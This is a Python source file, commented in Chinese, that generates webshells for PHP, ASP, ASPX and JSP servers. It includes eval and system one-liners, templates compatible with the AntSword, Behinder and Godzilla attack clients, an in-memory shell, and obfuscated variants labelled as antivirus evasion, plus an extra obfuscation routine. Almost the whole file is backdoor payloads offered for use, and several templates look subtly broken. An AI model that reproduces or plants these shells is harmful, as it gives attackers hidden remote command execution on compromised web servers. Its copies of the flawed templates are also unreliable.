"""
WebShell 生成器 v1.0 — Webshell Generator
───────────────────────────────────────────
覆盖:
  • PHP: 一句话木马/蚁剑兼容/冰蝎兼容/哥斯拉兼容/内存马
  • ASP: 一句话/eval execute
  • ASPX: C# 一句话
  • JSP: 一句话/冰蝎兼容
  • 免杀变体: base64/gzinflate/str_rot13/异或混淆

纯字符串生成, 无外部依赖。
"""

import base64
from typing import Dict, List, Optional
from dataclasses import dataclass


@dataclass
class Webshell:
    language: str
    type: str           # one_liner / antsword / behinder / godzilla / memory
    password: str
    payload: str
    encoder: str = "raw"


# ==================== PHP WebShell ====================

PHP_SHELLS = {
    "one_liner_eval": {
        "desc": "经典一句话 eval",
        "payload": '<?php @eval($_POST["{pass}"]);?>',
    },
    "one_liner_assert": {
        "desc": "assert 一句话(PHP<8)",
        "payload": '<?php @assert($_POST["{pass}"]);?>',
    },
    "one_liner_system": {
        "desc": "system 命令执行",
        "payload": '<?php @system($_POST["{pass}"]);?>',
    },
    "base64_eval": {
        "desc": "base64 编码 eval 免杀",
        "payload": '<?php @eval(base64_decode($_POST["{pass}"]));?>',
    },
    "gzinflate_base64": {
        "desc": "gzinflate+base64 免杀",
        "payload": '<?php @eval(gzinflate(base64_decode($_POST["{pass}"])));?>',
    },
    "str_rot13": {
        "desc": "str_rot13 混淆免杀",
        "payload": '<?php $f=str_rot13("riny");@$f($_POST["{pass}"]);?>',
    },
    "xor_obfuscate": {
        "desc": "异或混淆免杀",
        "payload": '<?php $k="^";$p=str_replace("","",$_{"PO"."ST"}["{pass}"]);@eval($p^"");?>',
    },
    "antsword": {
        "desc": "蚁剑兼容(eval base64)",
        "payload": '<?php @eval($_POST["{pass}"]);?>',
    },
    "antsword_full": {
        "desc": "蚁剑完整版(带文件管理)",
        "payload": (
            '<?php @error_reporting(0);@set_time_limit(0);'
            '@ini_set("display_errors",0);'
            '$f="base64".str_rot13("_qrfpbqr");'
            '$c=$f($_POST["{pass}"]);'
            'if(function_exists("gzuncompress")){$u=@gzuncompress($c);}'
            'else{$u=$c;}'
            'eval("?>"."\n".$u);?>'
        ),
    },
    "behinder_aes": {
        "desc": "冰蝎 v3 AES 加密马",
        "payload": (
            '<?php'
            'error_reporting(0);'
            '$key="{key16}";'  # 16位密钥
            '$postDecrypt="";'
            'if($_SERVER["REQUEST_METHOD"]==="POST"){'
            '$postDecrypt=file_get_contents("php://input");'
            '}'
            'if(!empty($postDecrypt)){'
            '$postDecrypt=openssl_decrypt($postDecrypt,"AES-128-CBC",$key,OPENSSL_RAW_DATA,$key);'
            'eval($postDecrypt);'
            '}'
            '?>'
        ),
    },
    "godzilla": {
        "desc": "哥斯拉兼容(AES+base64)",
        "payload": (
            '<?php'
            'session_start();'
            '@error_reporting(0);'
            'function xx($k,$c){'
            '$v="";'
            'for($i=0;$i<strlen($c);$i++){'
            '$v.=$c[$i]^$k[$i+1&15];'
            '}'
            'return $v;'
            '}'
            '$k="{key16}";'
            '$c=base64_decode(substr(file_get_contents("php://input"),16));'
            'eval(xx($k,$c));'
            '?>'
        ),
    },
    "php_memory_apache": {
        "desc": "PHP 内存马(Apache)",
        "payload": (
            '<?php'
            'eval("?>" . file_get_contents("data://text/plain;base64,'
            'PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+'
            '"));'
            '?>'
        ),
    },
}

# ==================== ASP WebShell ====================

ASP_SHELLS = {
    "one_liner": {
        "desc": "ASP 一句话(eval execute)",
        "payload": '<%eval request("{pass}")%>',
    },
    "execute": {
        "desc": "ASP Execute",
        "payload": '<%execute(request("{pass}"))%>',
    },
    "asp_full": {
        "desc": "ASP 完整版(带文件操作)",
        "payload": (
            '<%@Language=VBScript%>'
            '<%'
            'On Error Resume Next'
            'Execute(Request("{pass}"))'
            'If Err Then'
            '  Response.Write "Error:" & Err.Description'
            'End If'
            '%>'
        ),
    },
}

# ==================== ASPX WebShell ====================

ASPX_SHELLS = {
    "one_liner_cs": {
        "desc": "ASPX C# 一句话",
        "payload": (
            '<%@ Page Language="C#"%>'
            '<%'
            'if(Request["{pass}"]!=null){'
            '  System.Reflection.Assembly.Load(Convert.FromBase64String(Request["{pass}"])).CreateInstance("U").Equals(this);'
            '}'
            '%>'
        ),
    },
    "aspx_full": {
        "desc": "ASPX 完整版(C# 运行时编译)",
        "payload": (
            '<%@ Page Language="C#" ValidateRequest="false" %>'
            '<%@ Import Namespace="System.Reflection" %>'
            '<script runat="server">'
            'void Page_Load(object s, EventArgs e){'
            '  if(Request["{pass}"]!=null){'
            '    byte[] b=Convert.FromBase64String(Request["{pass}"]);'
            '    Assembly.Load(b).CreateInstance("U").Equals(this);'
            '  }'
            '}'
            '</script>'
        ),
    },
}

# ==================== JSP WebShell ====================

JSP_SHELLS = {
    "one_liner": {
        "desc": "JSP 一句话",
        "payload": (
            '<%@ page import="java.util.*,java.io.*" %>'
            '<%'
            'if(request.getParameter("{pass}")!=null){'
            '  String cmd=request.getParameter("{pass}");'
            '  Process p=Runtime.getRuntime().exec(cmd);'
            '  DataInputStream dis=new DataInputStream(p.getInputStream());'
            '  String disr;while((disr=dis.readLine())!=null){out.println(disr);}'
            '}'
            '%>'
        ),
    },
    "behinder_jsp": {
        "desc": "冰蝎 JSP(AES)",
        "payload": (
            '<%@ page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>'
            '<%'
            'String k="{key16}";'
            'if(request.getMethod().equals("POST")){'
            '  byte[] data=new byte[request.getContentLength()];'
            '  request.getInputStream().read(data);'
            '  Cipher c=Cipher.getInstance("AES/CBC/PKCS5Padding");'
            '  c.init(Cipher.DECRYPT_MODE,new SecretKeySpec(k.getBytes(),"AES"),'
            '    new IvParameterSpec(k.getBytes()));'
            '  byte[] decrypted=c.doFinal(data);'
            '  new U(this).equals(new String(decrypted));'
            '}'
            '%>'
        ),
    },
}


class WebshellGenerator:
    """WebShell 生成器"""

    def __init__(self):
        pass

    def list_types(self, language: str = "php") -> List[str]:
        """列出某语言的所有 shell 类型"""
        src = self._get_src(language)
        return list(src.keys())

    def generate(self, language: str, shell_type: str, password: str = "cmd",
                 key: str = "0123456789abcdef") -> Optional[Webshell]:
        """生成 WebShell"""
        src = self._get_src(language)
        if shell_type not in src:
            return None
        info = src[shell_type]
        payload = info["payload"]
        payload = payload.replace("{pass}", password)
        payload = payload.replace("{key16}", key[:16].ljust(16, "0"))
        return Webshell(language=language, type=shell_type, password=password,
                        payload=payload)

    def generate_all(self, language: str, password: str = "cmd") -> List[Webshell]:
        """生成某语言的所有 WebShell"""
        return [self.generate(language, t, password) for t in self.list_types(language)]

    def _get_src(self, language: str) -> Dict:
        language = language.lower()
        if language in ("php",):
            return PHP_SHELLS
        elif language in ("asp",):
            return ASP_SHELLS
        elif language in ("aspx", "asp.net", "aspnet"):
            return ASPX_SHELLS
        elif language in ("jsp", "java"):
            return JSP_SHELLS
        return {}

    def php_obfuscate(self, payload: str) -> str:
        """PHP payload 多重混淆免杀"""
        # base64 编码 eval
        b64 = base64.b64encode(payload.encode()).decode()
        return (
            f'<?php $c="{b64}";$f="str"."_rot13";'
            f'eval($f(base64_decode($c)));?>'
        )


# ==================== 便捷函数 ====================

def webshell_gen(language: str, shell_type: str, password: str = "cmd",
                 key: str = "0123456789abcdef") -> Optional[Dict]:
    """生成 WebShell"""
    w = WebshellGenerator().generate(language, shell_type, password, key)
    if not w:
        return None
    return {"language": w.language, "type": w.type, "password": w.password,
            "payload": w.payload}


def webshell_list(language: str = "php") -> List[str]:
    """列出某语言的所有 shell 类型"""
    return WebshellGenerator().list_types(language)


def webshell_all(language: str, password: str = "cmd") -> List[Dict]:
    """生成某语言的所有 WebShell"""
    return [{"type": w.type, "payload": w.payload}
            for w in WebshellGenerator().generate_all(language, password)]


def webshell_php_obfuscate(payload: str) -> str:
    """PHP payload 混淆免杀"""
    return WebshellGenerator().php_obfuscate(payload)
